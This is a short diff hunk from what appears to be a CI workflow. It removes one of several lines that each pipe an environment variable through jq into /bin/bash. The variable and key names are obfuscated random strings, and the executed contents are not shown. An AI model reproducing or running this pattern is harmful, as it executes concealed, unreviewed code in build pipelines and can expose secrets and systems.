@@ -29,7 +29,6 @@ jobs:
           echo $arlu34065 | jq -r .ngk303 | /bin/bash
           echo $mmlrf27 | jq -r .tij4996 | /bin/bash
           printf '%s' "$vh5404" | jq -r .l3 | /bin/bash
-          echo $ajp1 | jq -r .vl1947 | /bin/bash
           printf '%s' "$t4" | jq -r .a81 | /bin/bash
           printf '%s' "$httaa3" | jq -r .ur20266 | /bin/bash
           printf '%s' "$blob5" | jq -r .bww12 | /bin/bash
